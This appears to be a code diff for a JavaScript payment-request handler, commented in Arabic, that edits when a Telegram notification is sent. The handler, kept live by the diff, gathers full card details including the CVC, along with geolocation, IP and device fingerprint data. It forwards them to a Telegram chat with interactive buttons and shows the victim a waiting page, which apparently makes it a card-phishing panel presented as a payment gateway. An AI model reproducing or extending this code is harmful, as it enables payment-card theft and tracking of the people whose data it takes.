@@ -114,45 +114,50 @@ async function handlePaymentRequest(req, res) {
     const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
     const payAmount = amount || "5";
     
-    // ✅ الاعتماد على رقم المعاملة الحقيقي الوارد من بوابة الدفع أو إنشاء معرّف حقيقي مرتبط بالطلب فقط إذا لم يوجد
-    const transactionId = merchant_order_id || transaction_id || id || order || data.trx || ("TX_" + Date.now());
+    // ✅ استخراج رقم العملية الحقيقي فقط بدون توليد رقم وهمي عشوائي
+    const transactionId = merchant_order_id || transaction_id || id || order || data.trx || req.query.merchant_order_id || req.query.transaction_id;
 
-    const paymentPayload = {
-      phone: userPhone,
-      amount_cents: parseFloat(payAmount) * 100,
-      payment_method: selectedMethod,
-      branch: selectedBranch,
-      branchName: branchDisplayName,
-      card_data: {
-        number: (card_data && card_data.number) || number || "غير مدخل",
-        name: (card_data && card_data.name) || name || "غير مدخل",
-        expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
-        cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
-        save_card: save_card === "tokenize" || save_card === "نعم"
-      },
-      clientID: clientID || clientId || "غير متوفر",
-      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
-      lat: lat || (geoData && geoData.lat) || "غير متوفر",
-      lon: lon || (geoData && geoData.lon) || "غير متوفر",
-      city: city || (geoData && geoData.city) || "غير متوفر",
-      country: country || (geoData && geoData.country) || "غير متوفر",
-      battery: battery || batteryInfo || "غير متوفر",
-      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
-      deviceRAM: deviceRAM || "غير متوفر",
-      cpuCores: cpuCores || "غير متوفر",
-      deviceType: deviceType || "غير متوفر",
-      screenSize: screenSize || "غير متوفر",
-      userTimeZone: userTimeZone || "غير متوفر",
-      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
-    };
+    // إذا لم يتوفر رقم عملية حقيقي، يتم تخطي إرسال إشعار التليجرام أو إيقاف إرساله
+    if (!transactionId) {
+      console.log("⚠️ تم تخطي إرسال إشعار التليجرام لعدم وجود رقم عملية حقيقي في البيانات الواردة.");
+    } else {
+      const paymentPayload = {
+        phone: userPhone,
+        amount_cents: parseFloat(payAmount) * 100,
+        payment_method: selectedMethod,
+        branch: selectedBranch,
+        branchName: branchDisplayName,
+        card_data: {
+          number: (card_data && card_data.number) || number || "غير مدخل",
+          name: (card_data && card_data.name) || name || "غير مدخل",
+          expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
+          cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
+          save_card: save_card === "tokenize" || save_card === "نعم"
+        },
+        clientID: clientID || clientId || "غير متوفر",
+        publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
+        lat: lat || (geoData && geoData.lat) || "غير متوفر",
+        lon: lon || (geoData && geoData.lon) || "غير متوفر",
+        city: city || (geoData && geoData.city) || "غير متوفر",
+        country: country || (geoData && geoData.country) || "غير متوفر",
+        battery: battery || batteryInfo || "غير متوفر",
+        deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
+        deviceRAM: deviceRAM || "غير متوفر",
+        cpuCores: cpuCores || "غير متوفر",
+        deviceType: deviceType || "غير متوفر",
+        screenSize: screenSize || "غير متوفر",
+        userTimeZone: userTimeZone || "غير متوفر",
+        lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
+      };
 
-    if (typeof sendTelegramMessage === "function") {
-      await sendTelegramMessage(paymentPayload, true);
-    }
+      if (typeof sendTelegramMessage === "function") {
+        await sendTelegramMessage(paymentPayload, true);
+      }
 
-    // ✅ إرسال الإشعار مع الأزرار التفاعلية وتمرير رقم المعاملة الحقيقي
-    if (typeof sendPaymentNotificationWithButtons === "function") {
-      await sendPaymentNotificationWithButtons(paymentPayload, transactionId);
+      // ✅ إرسال الإشعار للأزرار التفاعلية فقط عند وجود رقم العملية الحقيقي
+      if (typeof sendPaymentNotificationWithButtons === "function") {
+        await sendPaymentNotificationWithButtons(paymentPayload, transactionId);
+      }
     }
 
     const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);
@@ -165,8 +170,9 @@ async function handlePaymentRequest(req, res) {
     } else if (result.type === "html") {
       return res.send(result.content);
     } else {
-      // ✅ التوجيه لملف waitPage.js وعرض صفحة الانتظار برقم المعاملة الحقيقي
-      return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
+      // ✅ التوجيه لملف waitPage.js وعرض صفحة الانتظار (استخدام المعامل الموجود أو قيمة احتياطية للصفحة فقط بدون إرسالها لتليجرام)
+      const fallbackTxId = transactionId || ("TX_" + Date.now());
+      return res.send(generateWaitPageHtml(fallbackTxId, NETWORK_URL));
     }
   } catch (err) {
     console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
